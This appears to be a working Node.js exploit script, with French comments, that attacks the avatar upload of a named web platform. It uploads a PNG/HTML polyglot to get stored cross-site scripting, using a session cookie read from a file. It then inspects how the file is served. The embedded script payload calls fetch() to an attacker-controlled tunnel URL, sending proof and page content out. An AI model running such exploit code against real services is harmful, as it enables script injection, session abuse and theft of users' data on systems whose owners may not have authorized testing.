// CYBERAAR : avatar — le serveur conserve-t-il l'extension / le type servi ?
// Chaine XSS visee : upload d'un fichier dont les octets commencent par un en-tete PNG
// (donc accepte par le filtre) mais qui contient du HTML, et qui est stocke/servi en .html
// -> le navigateur l interprete comme du HTML -> script executes sur l origine de la plateforme.
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const COOKIE = fs.readFileSync("/tmp/opencode/cyberaar/session-alias.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const TUN = fs.readFileSync("/tmp/opencode/cyberaar/tunnel-url.txt", "utf8").trim();

const PNG_OK = fs.readFileSync("/tmp/opencode/avatar-400.png");
const PAYLOAD = `<script>fetch('${TUN}/xss-proof?leaked=1').then(r=>r.text()).then(t=>fetch('${TUN}/xss-proof?body='+encodeURIComponent(t.slice(0,200))))</script>`;
// PNG (400x400 valides) + payload HTML a la suite
const POLY = Buffer.concat([PNG_OK, Buffer.from(PAYLOAD, "utf8")]);

async function up(label, filename, type, content) {
  const fd = new FormData();
  fd.append("file", new Blob([content], { type }), filename);
  for (let i = 0; i < 3; i++) {
    try {
      const t0 = Date.now();
      const r = await fetch(APP + "/api/aarme/account/avatar", { method: "POST", headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE }, body: fd, redirect: "manual", signal: AbortSignal.timeout(30000) });
      const t = await r.text();
      console.log("  " + label.padEnd(50) + "HTTP " + r.status + " " + String(Date.now() - t0).padStart(5) + "ms  " + t.replace(/\s+/g, " ").slice(0, 200));
      return { s: r.status, txt: t };
    } catch (e) { await sleep(4000); }
  }
  return { s: 0, txt: "ERR" };
}
async function avatarUrl() {
  const me = await fetch(APP + "/api/aarme/account/me", { headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Cookie: COOKIE } });
  const mt = await me.text();
  const m = mt.match(/"avatar":\s*("(?:[^"\\]|\\.)*")/);
  return m ? JSON.parse(m[1]) : "";
}
async function describe(url, label) {
  if (!url) { console.log("  (" + label + " : pas d'URL)"); return; }
  const full = url.startsWith("http") ? url : APP + url;
  const h = await fetch(full, { headers: { "User-Agent": UA }, redirect: "manual" });
  const hh = h.headers;
  const body = await h.text();
  console.log("  [" + label + "] " + full.replace(/^https?:\/\//, "").slice(0, 70));
  console.log("      HTTP " + h.status + " | content-type: " + (hh.get("content-type") || "-") + " | disposition: " + (hh.get("content-disposition") || "-") + " | nosniff: " + (hh.get("x-content-type-options") || "-"));
  console.log("      csp: " + (hh.get("content-security-policy") || "(aucune)").slice(0, 170));
  console.log("      taille: " + body.length + " car. | contient le payload : " + (body.includes("xss-proof") ? "OUI" : "non"));
  return { ct: hh.get("content-type"), nosniff: hh.get("x-content-type-options"), disp: hh.get("content-disposition"), body };
}
console.log("=== 1) l avatar deja accepte (PNG 400x400) : comment est-il servi ? ===\n");
const u1 = await avatarUrl();
console.log("  avatar = " + (u1 || "(vide)"));
await describe(u1, "PNG 400x400");
await sleep(20000);

console.log("\n=== 2) polyglotte : nom .html, octets PNG + payload HTML ===\n");
const r2 = await up("polyglotte PNG+HTML nomme x.html", "x.html", "image/png", POLY);
await sleep(4000);
if (r2.s === 200) {
  const u2 = await avatarUrl();
  console.log("  avatar = " + u2);
  await describe(u2, "polyglotte .html");
} else {
  console.log("  -> refuse par le filtre de type (le nom de fichier compte ?)");
  await sleep(20000);
  const r3 = await up("meme payload, nom .png (controle)", "x.png", "image/png", POLY);
  if (r3.s === 200) {
    const u3 = await avatarUrl();
    console.log("  avatar = " + u3);
    await describe(u3, "polyglotte .png");
  }
}
